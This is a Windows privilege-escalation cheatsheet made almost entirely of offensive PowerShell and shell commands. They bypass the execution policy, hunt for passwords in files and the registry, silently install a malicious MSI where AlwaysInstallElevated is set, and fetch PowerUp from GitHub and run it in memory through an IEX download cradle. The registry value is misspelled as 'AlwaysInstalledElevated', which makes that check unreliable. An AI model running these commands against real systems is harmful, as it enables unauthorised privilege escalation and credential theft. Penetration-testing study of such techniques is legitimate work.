# Windows Privilege Escalation Cheatsheet

## Powershell workarounds

### Powershell information

```powershell
echo $Env:PSModulePath
Get-ExecutionPolicy
```

### Bypass powershell execution policy

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

### Download a file

```powershell
Invoke-WebRequest http://url-to/file -OutFile C:\path\to\file
```

## Information gathering

### Processes and owners

```powershell
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

### Processes running as system

```powershell
tasklist /v /fi "username eq system"
```

### Windows Defender status

```powershell
Get-MpComputerStatus
```

### Search for passwords in filesystem

```powershell
findstr /si password *.xml *.ini *.txt *.config
reg query HKLM /f password /t REG_SZ /s /k
reg query HKCU /f password /t REG_SZ /s /k
```

## Perform an escalation

### MSI register

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
```

#### If both return 1, then get an evil.msi and:

```powershell
msiexec /quiet /qn /i evil.msi
```

## Popular tools

### PowerUp

```powershell
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```

